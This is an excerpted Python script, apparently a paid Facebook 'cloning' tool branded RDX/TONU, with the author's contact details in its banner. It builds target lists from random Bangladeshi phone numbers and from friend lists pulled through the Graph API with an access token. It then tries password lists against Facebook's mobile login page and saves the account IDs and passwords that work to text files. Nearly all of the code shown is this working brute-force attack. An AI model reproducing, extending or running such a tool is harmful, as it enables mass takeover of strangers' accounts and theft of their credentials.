...
logo = """'\x1b[1;92m' _______________________________ ______
 |  _ \|  __ \    |____|____| __ \|  \/  | |  | \ \ / /
 | |_) | |  | |______| |  | |__  | |__) | \  / | |  | |\ V / 
 |  _ <| |  | |______| |  |  __| |  _  /| |\/| | |  | | > <  
 | |_) | |__| |      | |  | |____| | \ \| |  | | |__| |/ . \ 
...
'\x1b[1;91m'   Author      :     MEHEDI HASAN TONU  
'\x1b[1;92m'   Github      :     TONU-143
'\x1b[1;93m'   FB ID       :     MEHEDI HASAN TONU
'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS
'\x1b[1;96m'   WAP NUMBER  :     01759916221           
"""
dec="2"
server="2"
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In RDX Paid Commands ")
...
def numcloning():
    ...
    print logo
    print ""
    print    "    \033[1;91m\n[ Bangladesh Random Number Cloning ]"
    
    print ""
    print ('\033[1;92m\n   [*] Enter First 4 Latter Of Any NetwoTONU : ')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[TONU-OK] "+coc+user + " | " + pass1
                ok=open('TONU-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[TONU-CP] "+coc+user + " | " + pass1
                    cp=open('RDX random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    print g+"[=] Extracting From TONU : "+my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RDX : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[TONU-CP] "+uid + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[TONU-OK] "+uid + " | " + pass2
                        ok=open('rsa-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[TONU-CP] "+uid + " | " + pass2
                            cp=open('rsa-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[TONU-OK] "+uid + " | " + pass3
                                ok=open('rsa-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[TONU-CP] "+uid + " | " + pass3
                                    cp=open('rsa-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[TONU-OK] "+uid + " | " + pass4
                                        ok=open('rsa-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;97m[TONU-CP] "+uid + " | " + pass4
                                            cp=open('rsa-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[TONU-OK] "+uid + " | " + pass5
                                                ok=open('rsa-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[TONU-CP] "+uid + " | " + pass5
                                                    cp=open('rsa-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[TONU-OK] "+uid + " | " + pass1
                ok=open('RDX-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[TONU-OK] "+uid + " | " + pass6
                                                        ok=open('RDX-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;97m[TONU-CP] "+uid + " | " + pass6
                                                            cp=open('RDX-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
